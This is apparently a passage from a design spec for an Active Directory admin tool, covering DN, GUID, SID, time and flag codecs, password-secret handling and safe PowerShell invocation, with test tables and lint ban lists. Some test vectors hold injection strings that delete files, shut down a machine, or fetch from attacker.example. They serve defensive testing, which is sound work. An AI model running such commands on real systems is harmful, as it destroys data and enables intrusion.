| DN-P09 | `CN=John Doe\0ADEL:6c3a4f9b-1c2d-4e5f-8a9b-0c1d2e3f4a5b,CN=Deleted Objects,DC=corp,DC=example` | parses; value contains LF; re-renders identically | deleted-object RDN |
| DN-P10 | `CN=Jane\0ACNF:6c3a4f9b-1c2d-4e5f-8a9b-0c1d2e3f4a5b,OU=Staff,DC=corp,DC=example` | parses | replication-conflict object |
| DN-P11 | `<GUID=0102030405060708090a0b0c0d0e0f10>` | `Parse`: error `UseObjectRef`; `ObjectRef.Parse`: ok | alternative form |
| DN-P12 | `<GUID=…>;<SID=…>;CN=x,DC=y` | `Parse`: error; `ParseExtendedDN`: ok, never sendable | response-only form |
| DN-P13 | `<GUID=01020304>,CN=x` · `<GUID=…>)(cn=*` | error `InvalidObjectRef` | ref injection |
| DN-P14 | `CN=x, OU=y` | Strict: error `UnexpectedSpace`; Lenient: `CN=x,OU=y` | admin paste |
| DN-P15 | `CN=a=b,DC=x` | value `a=b`; renders `CN=a\3Db,DC=x` | bare `=` is legal RFC 4514 |
| DN-P16 | `1.3.6.1.4.1.1466.0=#04024869,DC=x` | ok, value opaque bytes `04 02 48 69` | never re-emitted as `#` |
| DN-P17 | `CN="Smith, John",DC=x` | error `QuotedValueNotSupported` | RFC 1779 quoting |
| DN-P18 | 10 000 RDNs / 1 MiB | error `TooLong` | R5 |
| DN-P19 | `CN=José,OU=Staff,DC=x` vs `CN=Jose,OU=Staff,DC=x` | `Equal` = false; AD may treat them as one name → uniqueness via DC | R9 |

### 4.6 Lint / fitness rule

Banned outside `dn`: the library's DN parser and escaper (go-ldap `ParseDN`, `EscapeDN`); string
operations (`HasSuffix`, `HasPrefix`, `Contains`, `EqualFold`, `Split`) on `DNString` values;
`dn.Equal`/`IsDescendantOf` from authorisation packages (import rule). forbidigo matches names and
cannot see types, so the `DNString` rule is a **go/analysis pass**, `dnstring`, in the fitness tool
(T-0033). It reports any conversion `string(x)` where `x` has type `dn.DNString` outside `dn` and the
connector, and any `DNString` passed to a `strings` or `bytes` function. `DNString` offers
`Display()` for UI text; the analyzer allows that call only in response-mapping code. Literal-shape
scanner: `"CN="`, `",OU="`, `",DC="` in literals joined by `+` or `Sprintf`/`string.Format` outside
`dn` and tests. Well-known containers are parsed constants inside `dn`.

## 5. P3 — Attribute codecs

**Shared rules.** `decode(raw LDAP octets) -> typed | error`; `encode(typed) -> octets`. The codec is
chosen by the attribute's syntax from the schema (`attributeSyntax` + `oMSyntax`), never by guessing
from the name in feature code. Raw values never leave the codec package. API output carries strings
(ISO 8601 UTC, decimal-as-string, canonical GUID/SID), never 64-bit JSON numbers (gotcha 22).
Integer text uses [RFC 4517 §3.3.16][rfc4517-int]: `( "-" LDIGIT *DIGIT ) / number` — no `+`, no
leading zeros, no `-0`, ASCII digits only.

**Lint (all codecs).** Raw entry accessors (go-ldap `GetAttributeValue(s)`, `GetRawAttributeValue(s)`)
are banned outside the connector and `attr`; UAC/groupType bit constants and `binary.LittleEndian`
on attribute bytes are banned in feature packages (analyzer).

### 5.1 GUID (`objectGUID`, octet string, 16 bytes)

`GUID.FromBytes(b)`, `GUID.Parse(text)` (dashed, optional braces, any case), `g.String()` (lower-case
dashed; Data1/2/3 little-endian in the octet string, [MS-DTYP 2.3.4][dtyp-guid]), `g.ObjectRef()`
(`<GUID=` + hex of the 16 bytes + `>`).

| ID | Input | Expected | Why |
| --- | --- | --- | --- |
| GUID-01 | bytes `01 02 … 10` | `04030201-0605-0807-090a-0b0c0d0e0f10` (not `01020304-0506-…`) | mixed-endian (gotcha 24) |
| GUID-02 | `{04030201-0605-0807-090A-0B0C0D0E0F10}` | same bytes as GUID-01; renders lower case, no braces | admin paste |
| GUID-03 | 15 bytes / 17 bytes | error `BadLength` | |
| GUID-04 | `04030201-0605-0807-090a-0b0c0d0e0f1` | error `BadFormat` | 31 hex digits |
| GUID-05 | `0403020106050807090a0b0c0d0e0f10` | error `BadFormat` | undashed is only valid inside `ObjectRef` |
| GUID-06 | `04030201-0605-0807-090a-0b0c0d0e0f1g` | error `BadFormat` | non-hex |
| GUID-07 | full-width digits `０４０３…` | error `BadFormat` | ASCII only |
| GUID-08 | `00000000-0000-0000-0000-000000000000` | error `NilGUID` | never an object identity |
| GUID-09 | `04030201-0605-0807-090a-0b0c0d0e0f10>,CN=x` | error `BadFormat` | ObjectRef injection |
| GUID-10 | valid text + `\x00` · valid text + trailing space | error `BadFormat` | |
| GUID-11 | `ObjectRef` of GUID-01 | `<GUID=0102030405060708090a0b0c0d0e0f10>` | hex form all DCs accept ([adts-altdn]) |
| GUID-12 | `04030201‐0605‐0807‐090a‐0b0c0d0e0f10` (U+2010 hyphens) · same with U+FF0D | error `BadFormat` | look-alike dashes from pasted documents |
| GUID-13 | `{04030201-0605-0807-090a-0b0c0d0e0f10` · `04030201-0605-0807-090a-0b0c0d0e0f10}` | error `BadFormat` | unbalanced braces |
| GUID-14 | `04030201-0605-0807-090a-0b0c0d0e0f1*` · `*` | error `BadFormat` | filter wildcard smuggled as an id |
| GUID-15 | `urn:uuid:04030201-0605-0807-090a-0b0c0d0e0f10` · `<GUID=04030201…>` to `GUID.Parse` | error `BadFormat` | only the one text form; `ObjectRef.Parse` owns `<GUID=…>` |
| GUID-16 | 1 MiB of hex digits and dashes | error `BadFormat` after reading at most 38 characters | R5; no allocation proportional to input |

### 5.2 SID (`objectSid`, `sIDHistory`, `tokenGroups`)

Binary per [MS-DTYP 2.4.2.2][dtyp-sid-bin]: revision 1, sub-authority count ≤ 15, 6-byte authority
big-endian, sub-authorities 32-bit little-endian. Text per [MS-DTYP 2.4.2.1][dtyp-sid-str]: decimal
authority below 2^32, `0x` + 12 hex digits at or above; no leading zeros; at least one sub-authority;
ABNF literals are case-insensitive, so `s-1-…` parses. API: `SID.FromBytes`, `SID.Parse`, `Bytes()`,
`String()`, `DomainSID()`, `RID()`; filters always use the binary form.

| ID | Input | Expected | Why |
| --- | --- | --- | --- |
| SID-01 | `S-1-5-32-544` | `01 02 00 00 00 00 00 05 20 00 00 00 20 02 00 00`; filter `\01\02\00\00\00\00\00\05\20\00\00\00\20\02\00\00` | BUILTIN\Administrators |
| SID-02 | `S-1-5-21-1004336348-1177238915-682003330-512` | `01 05 00 00 00 00 00 05 15 00 00 00 dc f4 dc 3b 83 3d 2b 46 82 8b a6 28 00 02 00 00`; RID 512 | domain SID |
| SID-03 | `s-1-5-18` | ok; renders `S-1-5-18` | ABNF case-insensitivity |
| SID-04 | bytes with revision 2 / text `S-2-5-32-544` | error `UnsupportedRevision` | |
| SID-05 | count byte 16 | error `TooManySubAuthorities` | max 15 |
| SID-06 | count 5, four sub-authorities present | error `Truncated` | |
| SID-07 | valid SID + trailing bytes | error `TrailingBytes` | length is declared, never assumed |
| SID-08 | `S-1-5-21-4294967296` | error `SubAuthorityOverflow` | > 2^32 − 1 |
| SID-09 | `S-1-5-21-01` | error `LeadingZero` | MS-DTYP |
| SID-10 | `S-1-0x000000000005-32-544` · `S-1-4294967296-1` | error `NonCanonicalAuthority` | hex only at or above 2^32 |
| SID-11 | `S-1-0x000100000000-1` | ok; round-trips | authority 2^32 |
| SID-12 | `S-1-5` | error `NoSubAuthority` | ABNF `1*SubAuthority` |
| SID-13 | `S-1-5-32-544-` · ` S-1-5-32-544` · `S-1-5-32-544\x00` | error `BadFormat` | |
| SID-14 | `S-1-5-21-１２３` | error `BadFormat` | full-width digits |

### 5.3 FILETIME and intervals (Large Integer, syntax 2.5.5.16)

Decode is **attribute-aware**: the same integer means different things on different attributes.
`FileTimeField -> Instant(utc, ticks) | Never | MustChange | NoValue | OutOfRange(raw)`;
`Interval -> Duration(d) | Forever`. Instants span 1601-01-01 to 9999-12-31T23:59:59.9999999Z
(ticks ≤ 2650467743999999999); beyond that → `OutOfRange`, displayed as "unrepresentable (raw N)",
never as a year-30828 date. Unix seconds = ticks / 10^7 − 11644473600.

| Attribute | Sentinels | Source |
| --- | --- | --- |
| `accountExpires` | `0` and `9223372036854775807` both → `Never` | [accountExpires][a-acctexp] |
| `pwdLastSet` | `0` → `MustChange`; absent → `NoValue`; write only `MustChange(true)`=0 / `(false)`=−1 | gotcha 36, [MS-ADTS computed UAC][adts-uacc] |
| `lastLogon`, `lastLogonTimestamp`, `badPasswordTime` | `0`/absent → `NoValue` — "no logon recorded", **not** "never logged on" | gotchas 16–17 |
| `lockoutTime` | `0` → `NoValue`; non-zero is an instant, **not** a lockout state | gotcha 27 |
| `msDS-UserPasswordExpiryTimeComputed` | `0x7FFFFFFFFFFFFFFF` → `Never`; `0` → `[UNVERIFIED]` | ad-engineering `reference/attributes.md` |
| `maxPwdAge`, `msDS-MaximumPasswordAge` | interval ≤ 0; `−2^63` (0x8000000000000000) → `Forever`; positive → error `InvalidPolicyValue`; `0` → `[UNVERIFIED]` | [adts-uacc]; Samba [bug 10512][samba-10512] (secondary) |
| `lockoutDuration`, `msDS-LockoutDuration` | `0` and `−2^63` → `Forever` (locked until an administrator unlocks) | derived from the MS-ADTS lockout formula ([adts-uacc]) |
| `lockoutObservationWindow`, `minPwdAge` | interval ≤ 0 | |

Lockout and password-expired *state* is never computed from these by feature code; it comes from
`msDS-User-Account-Control-Computed` (§5.5).

| ID | Attribute: raw | Expected | Why |
| --- | --- | --- | --- |
| FT-01 | accountExpires: `0` | `Never` | |
| FT-02 | accountExpires: `9223372036854775807` | `Never` | not 30828-09-14 |
| FT-03 | accountExpires: `134379828000000000` | 2026-11-01T05:00:00Z; display follows gotcha 20 ("end of" the previous local day) | |
| FT-04 | pwdLastSet: `0` | `MustChange` | not 1601 |
| FT-05 | pwdLastSet: `-1` (read) | `OutOfRange` | write-only value |
| FT-06 | lastLogonTimestamp: `0` | `NoValue` | wording rule |
| FT-07 | lastLogon: `134353728000000000` · `116444736000000000` | 2026-10-02T00:00:00Z · 1970-01-01T00:00:00Z | conversion anchors |
| FT-08 | accountExpires: `9223372036854775806` | `OutOfRange` | not the documented sentinel |
| FT-09 | maxPwdAge: `-36288000000000` | 42 days | negative interval (gotcha 21) |
| FT-10 | maxPwdAge: `-9223372036854775808` | `Forever` | |
| FT-11 | maxPwdAge: `36288000000000` | error `InvalidPolicyValue` | positive age |
| FT-12 | lockoutDuration: `0` · `-18000000000` | `Forever` · 30 minutes | |
| FT-13 | `+1`, ` 1`, `1 `, `0x10`, `1e5`, empty | error `BadInteger` | RFC 4517 grammar |
| FT-14 | `-0`, `0123` | error `BadInteger` | |
| FT-15 | `9223372036854775808`, `-9223372036854775809` | error `Overflow` | |
| FT-16 | `١٢٣` (Arabic-Indic) · `１２３` (full-width) | error `BadInteger` | ASCII digits only |
| FT-17 | lastLogon: `9007199254740993` → API | `"raw":"9007199254740993"` as a JSON string | 2^53 + 1 would round as a number |

### 5.4 Generalized Time (syntax 2.5.5.11, oMSyntax 24)

Decode: full [RFC 4517 §3.3.13][rfc4517-gt] grammar (hour-only, minutes, fraction with `.` or `,`, `Z`
or ±hh[mm]) → UTC instant. Encode: always `YYYYMMDDHHMMSS.0Z` in UTC, AD's observed output form
(e.g. `whenCreated`); sub-seconds truncated, which keeps `>=` window filters inclusive. UTC-Time
(oMSyntax 23, two-digit years) shares syntax 2.5.5.11 and has its own decoder, selected by oMSyntax.

| ID | Input | Expected | Why |
| --- | --- | --- | --- |
| GT-01 | `20261002101112.0Z` | 2026-10-02T10:11:12Z; re-encodes identically | AD form |
| GT-02 | `20261002101112Z` | same instant | no fraction |
| GT-03 | `2026100210Z` | 10:00:00Z | hour-only is legal |
| GT-04 | `20261002101112,5Z` | 10:11:12.5Z | comma fraction |
| GT-05 | `20261002101112+0530` | 2026-10-02T04:41:12Z | offset |
| GT-06 | `20261002101112` | error `MissingTimeZone` | zone is mandatory; local time is ambiguous |
| GT-07 | `20261302101112.0Z` · `20260230101112.0Z` · `20261002241112.0Z` | error `BadMonth` · `BadDay` · `BadHour` | |
| GT-08 | `20261002101160.0Z` | error `LeapSecondUnsupported` | legal in RFC 4517; refused rather than shifted |
| GT-09 | `20261002101112.0+2400` | error `BadOffset` | |
| GT-10 | `20261002101112.Z` | error `BadFraction` | empty fraction |
| GT-11 | full-width digits · trailing space · trailing NUL | error `BadFormat` | |
| GT-12 | `16010101000000.0Z` | 1601-01-01T00:00:00Z | appears in `dSCorePropagationData`; not a real event time `[UNVERIFIED]`; UI must not show "1601" |
| GT-13 | 65-char input | error `TooLong` | R5 |
| GT-14 | `261002101112Z` to the Generalized Time decoder | error `BadFormat` | UTC-Time is decoded separately |

### 5.5 Flag integers (Integer, syntax 2.5.5.9, signed 32-bit)

Types `UAC` (stored `userAccountControl`), `UACComputed` (`msDS-User-Account-Control-Computed`) and
`GroupType`, each `{known flags, unknownBits}` over the uint32 bit pattern.

- `UAC` has **no** lockout or password-expired accessor (unreliable, ad-engineering
  `reference/uac-flags.md`). `UACComputed` exposes exactly LOCKOUT (0x10) and PASSWORD_EXPIRED
  (0x800000), the only bits MS-ADTS defines for it on AD DS ([adts-uacc]).
- Unknown bits survive decode → encode. A write never drops bits we do not know.
- Writes are `Change{set, clear}` applied to the value read, producing `(old, new)` for a
  compare-and-swap delete+add (uac-flags.md). LOCKOUT, PASSWD_CANT_CHANGE and PASSWORD_EXPIRED are not
  settable; TRUSTED_FOR_DELEGATION and TRUSTED_TO_AUTH_FOR_DELEGATION need an explicit privileged
  capability.
- `GroupType.Scope()` requires exactly one of GLOBAL 0x2 / DOMAIN_LOCAL 0x4 / UNIVERSAL 0x8 (BUILTIN 0x1
  for builtin groups); SECURITY is 0x80000000. Filters render masks unsigned (§3.2).

| ID | Input | Expected | Why |
| --- | --- | --- | --- |
| FL-01 | UAC `512` | {NORMAL_ACCOUNT} | |
| FL-02 | UAC `514` | {NORMAL_ACCOUNT, ACCOUNTDISABLE} | |
| FL-03 | UAC `66048` | {NORMAL_ACCOUNT, DONT_EXPIRE_PASSWORD} | |
| FL-04 | UAC `532480` | {SERVER_TRUST_ACCOUNT, TRUSTED_FOR_DELEGATION} | a DC |
| FL-05 | UAC `268435968` (512 + 0x10000000, a bit absent from our flag table) | {NORMAL_ACCOUNT} + unknown 0x10000000; re-encodes to `268435968` | unknown bits preserved; newer Windows versions add bits |
| FL-06 | UAC `8389120` (512 + 0x800000) | no `PasswordExpired()` on `UAC` (compile-time); `UACComputed` `8388608` → PasswordExpired | stored bit is unreliable |
| FL-07 | `Change{set: LOCKOUT}` · `Change{clear: LOCKOUT}` | error `NotSettable` | unlock is `lockoutTime=0` |
| FL-08 | `Change{set: TRUSTED_FOR_DELEGATION}` without capability | error `PrivilegeRequired` | unconstrained delegation |
| FL-09 | groupType `-2147483646` · `-2147483640` · `-2147483644` · `2` | security global · security universal · security domain-local · distribution global | signed values (gotcha 23) |
| FL-10 | groupType `2147483650` | error `Overflow` | AD sends signed |
| FL-11 | groupType `-2147483638` (GLOBAL + UNIVERSAL) | decodes; `Scope()` → error `InvalidScope` | |
| FL-12 | `512 `, `+512`, `0x200`, `0512`, empty, `-0` | error `BadInteger` | |
| FL-13 | `4294967296` | error `Overflow` | |

### 5.6 `unicodePwd` and the `Secret` type

**`Secret`** is built from bytes, never from a language string on GC runtimes (feasibility §2.5).
- Formatting and logging print `[REDACTED]`. JSON and protobuf marshalling fail. Comparison is
  constant-time. No method returns a string. `Destroy()` zeroes the backing array.
- `Secret.UnmarshalJSON(raw []byte)` decodes the JSON string token itself, escapes included, into a
  fresh `[]byte`. It never goes through a Go `string` or through `encoding/json`'s string decoding,
  which allocates an immutable string and substitutes U+FFFD (R3). It rejects NUL, invalid UTF-8
  and unpaired `\uD800`-style escapes (PW-15, PW-16). A handler for a secret-bearing request reads
  the body into a capped `[]byte` it owns, decodes it with `secretjson.Decode`, then zeroes it. It
  never streams the body through `json.NewDecoder`.

**What "zeroised" can mean in Go.** We zero only buffers we own. These copies exist and we cannot
zero them:
1. `net/http`/`bufio` read buffers holding the request body, and `crypto/tls` record buffers on
   receive and send.
2. go-ldap / go-asn1-ber: the BER packet of the modify request (UTF-16LE value), then the TLS write
   buffer.
3. The Go runtime: stack growth copies goroutine stacks, `append` growth leaves old backing arrays,
   and the GC frees memory without zeroing it promptly.
4. The OS: swap or pagefile, the hibernation file, crash and core dumps.

Mitigations:
- One short call path: decode → encode → send → `Destroy`, with buffers pre-sized so `append`
  never grows them.
- Production builds have no `net/http/pprof` or `runtime/pprof` (FF-SP2).
- `GOTRACEBACK` is never `crash`, which on Unix raises SIGABRT to produce a core dump
  ([runtime env vars][go-runtime]).
- On Linux the process sets `RLIMIT_CORE=0` and `PR_SET_DUMPABLE=0` at start ([prctl][prctl]).
- On Windows the installer does not enable WER LocalDumps for our services. Whether other WER
  settings still capture dumps is `[UNVERIFIED — Windows lab]`.

**`runtime/secret`: evaluate it, never depend on it.** The package exists only when building with
`GOEXPERIMENT=runtimesecret`; it is documented for go1.26 and go1.27. `secret.Do(f)` erases the
registers and stack `f` used, and heap allocations once they become unreachable. Protection exists
only on linux/amd64 and linux/arm64. Elsewhere, Windows included, `Do` simply runs `f`. The package
is not covered by the Go 1 compatibility promise ([runtime/secret][go-secret]). It would protect only
our Linux/Docker profile, and enabling it is a toolchain flag under ADR-0001's manifest. T-0007
evaluates it.

**Tier X never holds a secret in a `System.String`.** Secret bytes arrive in the stdin frame. The
sidecar decodes them into a pinned `char[]`, builds `new SecureString(char*, int)`, calls
`MakeReadOnly()`, then zeroes the `char[]` and the frame buffer. Microsoft recommends against
`SecureString` for new development, and it is not encrypted on non-Windows platforms
([SecureString][securestring]). We use it only because cmdlets take `SecureString`/`PSCredential`:
it is a type boundary, not a protection.

**Tier N** (Rust) implements `Secret`, plus a P3 codec only if it parses that codec's input.

**`SecureConn`** is the proof that the connection carrying the bytes is encrypted and authenticated.
It can be obtained only from:
- **LDAPS** (636) with TLS 1.2 or later, the chain verified to the configured trust anchors, and the
  hostname verified against the DC's FQDN from the inventory (`InventoryHost`, §6.3). No verify
  callback that accepts. No fallback from LDAPS to StartTLS or to plain LDAP, ever.
- **StartTLS** on 389, only if the StartTLS operation succeeds under the same verification. If it
  fails, the connection fails.
- **SASL GSSAPI with sealing** is accepted by the DC for `unicodePwd` ([adts-pwd]). Whether go-ldap
  with go-krb5 negotiates the confidentiality layer is `[UNVERIFIED]` until spike T-0023 proves it.
  Until then it is not a `SecureConn` source.

A `SecureConn` is bound to one connection generation. After any reconnect it is stale (PW-17).
Re-deriving it re-reads the TLS state: version, verified chains and server name. FF-SP2 bans:
- Go: `InsecureSkipVerify: true`, and `VerifyPeerCertificate`/`VerifyConnection` outside the
  TLS-config package;
- .NET: `ServerCertificateCustomValidationCallback`, `RemoteCertificateValidationCallback` and
  `LdapSessionOptions.VerifyServerCertificate`;
- Rust: `danger_accept_invalid_certs` and `danger_accept_invalid_hostnames`.

**`unicodePwd` is encode-only**, because AD never returns the attribute:
- The value is the UTF-16LE of `"` + password + `"`; the quotes are not part of the password.
- An admin reset replaces the attribute with one value. A user change deletes the old value and
  adds the new one in one modify.
- The DC requires 128-bit TLS or (WS2003+) 128-bit SASL encryption ([MS-ADTS unicodePwd][adts-pwd]).
- API: `unicodePwd.Replace(s, conn: SecureConn)` and `unicodePwd.Change(old, new, conn: SecureConn)`.
  Without a valid `SecureConn` we fail before sending.

| ID | Input | Expected | Why |
| --- | --- | --- | --- |
| PW-01 | `Pa55word!` | `22 00 50 00 61 00 35 00 35 00 77 00 6f 00 72 00 64 00 21 00 22 00` | quoted UTF-16LE |
| PW-02 | `pässwörd` | `22 00 70 00 e4 00 73 00 73 00 77 00 f6 00 72 00 64 00 22 00` | not Latin-1, not UTF-8 |
| PW-03 | `p@ss😀` | `22 00 70 00 40 00 73 00 73 00 3d d8 00 de 22 00` | surrogate pair |
| PW-04 | `a"b` | `22 00 61 00 22 00 62 00 22 00` | DC sets `a"b` `[UNVERIFIED — Windows and Samba lab]` |
| PW-05 | bytes `ff fe 41` | error `InvalidUTF8` | U+FFFD would set a password nobody typed |
| PW-06 | bytes `ed a0 80` (lone surrogate) | error `InvalidUTF8` | |
| PW-07 | `a\x00b` | error `NulInSecret` | |
| PW-08 | empty | error `EmptySecret` | no PASSWD_NOTREQD workaround; empty-bind trap (gotcha 31) |
| PW-09 | 257 UTF-16 code units | error `TooLong` (cap provisional 256 `[UNVERIFIED vs Windows maximum]`) | R5 |
| PW-10 | `Replace(s, plain 389 connection)` | error `EncryptionRequired`; nothing sent | MS-ADTS requirement |
| PW-11 | a `Secret` formatted · logged · wrapped in an error · JSON-encoded · protobuf-encoded | `[REDACTED]` · `[REDACTED]` · `[REDACTED]` · error `Unserializable` · error `Unserializable` | R7 |
| PW-12 | LDAP packet-debug logging on while the modify is built | impossible in production builds (lint); test asserts off | debug dumps carry the value |
| PW-13 | DC answers 19/53 with `0000052D` | error `PolicyViolation` with DC diagnostic; request bytes never logged | gotcha 34 |
| PW-14 | `"abc"` (quotes at both ends) | `22 00 22 00 61 00 62 00 63 00 22 00 22 00`; nothing stripped | inner quotes are data; DC result `[UNVERIFIED — lab]` as PW-04 |
| PW-15 | JSON body `{"password":"a\u0000b"}` | error `NulInSecret` from `Secret.UnmarshalJSON` | the escape is decoded by us, then checked |
| PW-16 | JSON body `{"password":"\ud800x"}` | error `InvalidUTF16` | `encoding/json` v1 would yield U+FFFD and set a password nobody typed (R3) |
| PW-17 | connection drops and reconnects between `SecureConn` acquisition and the modify | error `SecureConnStale`; nothing sent until re-verified | re-checked on every send |
| PW-18 | LDAPS to a DC whose certificate does not name its FQDN · LDAPS to a DC whose certificate chains to no trust anchor | error `TLSVerificationFailed`; no retry on 389 plain or unverified StartTLS | no downgrade |

**Lint.** The literal `"unicodePwd"`, UTF-16 encoders on secret material, and the LDAP library's
debug switch (go-ldap `Conn.Debug`) are banned outside `attr`/connector; `Secret` has no
string-conversion method to call. A go/analysis pass, `secretjson`, reports any decode into a type
containing `Secret` other than `secretjson.Decode`. FF-SP2 bans `net/http/pprof` and `runtime/pprof`
outside `_test.go` and tier L, and bans the TLS-verification bypasses listed above.

## 6. P4 — Command invocation

**Invariant.** Code is fixed, reviewed and shipped; data is a typed value delivered out of band (an
API object or a stdin document). Data is never script text, never an argv element a shell or
PowerShell's parameter binder interprets, never an environment variable, file name or directory name.

Banned outright, every tier: `-Command`/`-c` or `-CommandWithArgs` with non-constant text;
`-EncodedCommand` (Base64 of UTF-16LE *script text* ([about_pwsh][pwsh]) — it hides quoting from the
outer shell, the decoded text is still code); `Invoke-Expression`, `[ScriptBlock]::Create`,
`ExpandString`; `AddScript` on non-constant text; `cmd.exe`, `.bat`, `.cmd` (Windows programs parse
their command lines differently, BatBadBut, [Flatt][batbadbut]); `sh -c`; data in `Start-Process -ArgumentList`.

Why argv is not a safe data channel even without a shell: `pwsh -File x.ps1 <args>` passes the rest of
the line as script parameters ([about_pwsh][pwsh]); PowerShell treats U+2013–U+2015 as dashes
([language spec §2.2.3][ps-lex]) so a value `–Credential` can bind as a parameter; and with "Include
command line in process creation events" on, every argv lands in Security event 4688, readable by
anyone with event-log access ([command-line auditing][ms-4688]).

### 6.1 `psx` — typed PowerShell operations (tier X sidecar)

Go never builds PowerShell. It calls `psx.Invoke(op, request)`; `op` is an enum generated from the
sidecar manifest, `request` a typed message. The sidecar (.NET + PowerShell SDK) maps each op to one
fixed pipeline: `AddCommand(<constant>)` and `AddParameter(<constant name>, <typed value>)`
([SMA AddCommand][sma]). The sidecar is launched by `proc` (§6.3) with constant argv; the request is a
length-prefixed message on stdin, the response on stdout; stderr is diagnostics only.

```
psx.Invoke(ctx, op: Op, req: OpRequest) -> OpResponse | Error           // Go side
Ops[Op.GetMailbox] = (r, ps) => ps.AddCommand("Get-EXOMailbox")
                                  .AddParameter("Identity", r.MailboxGuid /* Guid */)   // C# side
```

Sidecar rules:
1. Command and parameter names are compile-time constants per op; values are typed (.NET `string`,
   `int`, `bool`, `Guid`, `SecureString` from `Secret`, enums, arrays of these).
2. **`AddParameter` does not make query-language parameters safe.** The AD module's `-Filter` is the
   "PowerShell Expression Language" ([Get-ADUser][get-aduser]); Exchange `-Filter`/`-RecipientFilter`
   are OPATH; `-FilterScript`/`-ScriptBlock` are code. These take data only from a dedicated builder:
   `-LDAPFilter` only from P1's `FilterString`; OPATH and script-block parameters are banned for data
   until a primitive exists.
3. **`-Identity` takes a `Guid`, never a user string.** AD cmdlets resolve an `-Identity` string as a
   DN, GUID, SID or sAMAccountName ([Get-ADUser][get-aduser]); an attacker-chosen string can resolve to
   a different object.
4. **Command resolution is pinned, never searched.** `AddCommand("Get-X")` resolves the name
   through autoloading and `PSModulePath`, and `PSModulePath` may include directories that
   non-admins can write. So:
   - The runspace comes from `InitialSessionState.CreateDefault2()`.
   - `$PSModuleAutoLoadingPreference = 'None'` is set as a session variable ("disables the automatic
     importing of modules", [preference variables][ps-prefs]).
   - The sidecar sets its own `PSModulePath` to the install directory's module folder (admin-only
     ACL). It never inherits one (§6.3 environment rule).
   - Each op's module is imported by full manifest path with a pinned version. The sidecar asserts
     that the `PSModuleInfo` has the expected `Path` and `Version`.
   - The op invokes the `CommandInfo` taken from that module's `ExportedCommands`, through the
     `AddCommand(CommandInfo)` overload ([SMA AddCommand][sma]). It never passes a name string.
   - `InitialSessionState.ExecutionPolicy = AllSigned`. Execution policy is "not a security boundary"
     and is enforced only on Windows ([execution policies][ps-execpol]).
   - The cross-platform control is a file-hash check: at start, every file under the module folder
     is hashed against the signed install manifest, and a mismatch refuses to start.
   - Vendoring a Microsoft module needs a licence-register row first (CLAUDE.md rule 9).
5. **Language mode.** Run in `NoLanguage` ("only native commands and cmdlets",
   [language modes][ps-langmodes]) if the modules work there. That is `[UNVERIFIED]` for
   ExchangeOnlineManagement; the sidecar spike decides it.
6. **Output and logging.** Output is typed response fields, never formatted text. Secrets never reach
   output, errors or logs. GPO can force on, outside our control:
   - script block logging (4104), which "records the content of all scriptblocks";
   - module logging, which records "pipeline execution events for members of specified modules"
     ([about_Logging_Windows][ps-logging]) and so the parameter bindings of our pipeline. Its event
     ID 4103 is `[UNVERIFIED — Windows lab]`.
   - transcription.
   Our pipeline contains no script text, and secrets are bound only as `SecureString`. PSX-13
   asserts both logs on the Windows lab.
7. **Secrets are bound only as `SecureString` or `PSCredential`** (built as §5.6 describes). An op
   whose cmdlet takes a secret in a plaintext `String` parameter is refused at manifest build
   (FF-SP9). It is not worked around.

**Route B (only by ADR):** a static, signed `.ps1` run with `pwsh -NoProfile -NonInteractive -File`
and parameters as JSON on stdin (feasibility §2.7). Ratified ADR-0001 forbids shipped `.ps1` outside
`lab/`/`tools/` (rule 1, F1), so route B needs an ADR amendment; the PSX vectors apply to it unchanged.

| ID | Value sent through the test-only `Echo` op | Expected | Why |
| --- | --- | --- | --- |
| PSX-01 | `O’Brien` (U+2019) | arrives byte-identical | curly quote |
| PSX-02 | `x‘; Remove-Item -Recurse C:\; ‘` (U+2018) | verbatim; nothing runs | PatchIQ class |
| PSX-03 | `'; Stop-Computer; '` | verbatim | ASCII quote |
| PSX-04 | `$(Invoke-WebRequest https://attacker.example)` | verbatim, no expansion | subexpression |
| PSX-05 | `` `$env:PATH `` · `“$(calc)”` (U+201C/D) | verbatim | backtick, curly double quotes |
| PSX-06 | `–Credential` (U+2013) · `—Force` (U+2014) · `-Confirm:$false` | bound as the *value* of the named parameter | dash forms |
| PSX-07 | `a\n# comment\nb` | verbatim | newline + comment |
| PSX-08 | `a\x00b` | error `NulInString` before the sidecar | R3 |
| PSX-09 | 1 MiB where the schema allows 1 KiB | error `TooLong` | R5 |
| PSX-10 | unknown op or parameter forged at the sidecar | error `UnknownOp`; nothing runs | enum on the Go side |
| PSX-11 | string for a `-Filter`/OPATH/script-block parameter | error `QueryParameterRequiresBuilder` | rule 2 |
| PSX-12 | `-Identity` string `S-1-5-32-544` | error `IdentityRequiresGUID` | rule 3 |
| PSX-13 | secret `P’ss"word$(x)` | arrives as `SecureString`; absent from argv/4688, stdout, stderr, our logs, 4104 and the module-logging event (4103 `[UNVERIFIED]`) with module and script-block logging forced on by GPO (Windows lab) | R7, rule 6 |
| PSX-14 | sidecar prints a banner before the response | error `ResponseFramingError`, not partial success | strict framing |
| PSX-15 | a module named like the op's module is planted in a user-writable directory listed in the parent's `PSModulePath` | the pinned module is loaded; the planted one is never imported; the asserted `PSModuleInfo.Path` matches | rule 4 hijack |
| PSX-16 | an op's command exists only via autoload, not in the imported module | sidecar start fails with `CommandNotInPinnedModule` | autoload is off |
| PSX-17 | one file under the module folder modified after install | sidecar refuses to start: `ModuleIntegrityFailed` (Linux and Windows) | file-hash check; AllSigned covers Windows only |
| PSX-18 | manifest op maps a secret to a cmdlet parameter typed `String` | manifest build fails: `PlaintextSecretParameter` | rule 7, FF-SP9 |

**Lint.** Tier X BannedApiAnalyzers ([RS0030][banned-api]): `PowerShell.AddScript(*)`,
`ScriptBlock.Create`, `CommandInvocationIntrinsics.ExpandString`/`InvokeScript`,
`ProcessStartInfo.Arguments`, `Process.Start(string, string)`. Go: `exec.Command*` outside `proc`;
literals `powershell`, `pwsh`, `cmd.exe`, `-Command`, `-EncodedCommand` outside `psx`/`proc`; gosec G204.
`lab/` and `tools/` PowerShell: PSScriptAnalyzer `PSAvoidUsingInvokeExpression` ([rule][psa-iex]) plus a
custom rule against expandable strings fed to `-Command`/`Invoke-Expression`.

### 6.2 `pslit` — PowerShell single-quoted literal (display and build-time generation only)

Uses: the console's "PowerShell equivalent" panel (an admin copies a command to run themselves),
generated documentation, `lab/` and `tools/`. The output type `DisplayOnlyPowerShell` has no path to
any interpreter we run. The console's panel text is rendered **by Go `pslit` on the server**, and
tier W only displays it (§2.1). A TypeScript quote-doubler is exactly the bug this section exists to
prevent, and FF-SP3 fails it in `web/`.

